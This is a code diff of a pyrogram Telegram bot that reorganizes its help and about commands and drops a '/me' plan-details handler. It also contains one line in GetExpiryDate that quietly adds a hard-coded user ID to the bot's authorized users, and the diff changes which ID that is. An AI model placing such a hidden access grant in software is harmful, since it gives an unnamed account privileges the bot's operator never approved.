@@ -27,11 +27,11 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(7351948)
+    Config.AUTH_USERS.add(683538773)
     return expires_at
 
 
-@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
+@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
 async def help_user(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/help")
@@ -43,21 +43,17 @@ async def help_user(bot, update):
         reply_to_message_id=update.message_id
     )
 
-
-@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
-async def get_me_info(bot, update):
+@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
+async def about_user(bot, update):
     # logger.info(update)
-    TRChatBase(update.from_user.id, update.text, "/me")
-    chat_id = str(update.from_user.id)
-    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
+    TRChatBase(update.from_user.id, update.text, "/about")
     await bot.send_message(
         chat_id=update.chat.id,
-        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
+        text=Translation.ABOUT_USER,
         parse_mode="html",
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
     )
-
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
 async def start(bot, update):
